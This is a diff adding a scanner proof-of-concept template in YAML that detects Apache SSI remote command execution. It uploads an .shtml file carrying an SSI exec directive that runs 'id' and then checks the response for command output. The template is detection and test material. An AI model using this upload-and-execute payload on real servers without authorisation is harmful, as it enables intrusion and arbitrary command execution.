@@ -1,0 +1,29 @@
+name: poc-yaml-apache-ssi-rce
+set:
+  r1: randomInt(5, 10)
+  r2: randomLowercase(r1)
+rules:
+  - method: POST
+    headers:
+      Content-Type: multipart/form-data; boundary=---------------------------{{r2}}
+    body: |
+      -----------------------------{{r2}}
+      Content-Disposition: form-data; name="file_upload"; filename="{{r1}}.shtml"
+      Content-Type: text/plain
+      
+      <!--#exec cmd="id;rm {{r1}}.shtml" -->
+      
+      -----------------------------{{r2}}--
+    follow_redirects: false
+    expression: |
+      response.status == 200
+  - method: GET
+    path: /{{r1}}.shtml
+    follow_redirects: false
+    expression: |
+        response.status == 200 && "uid=".bmatches(response.body)
+detail:
+  vulnType: Apache SSI 远程命令执行漏洞
+  author: supersalted(https://github.com/salted)
+  links:
+    - https://vulhub.org/#/environments/httpd/ssi-rce/
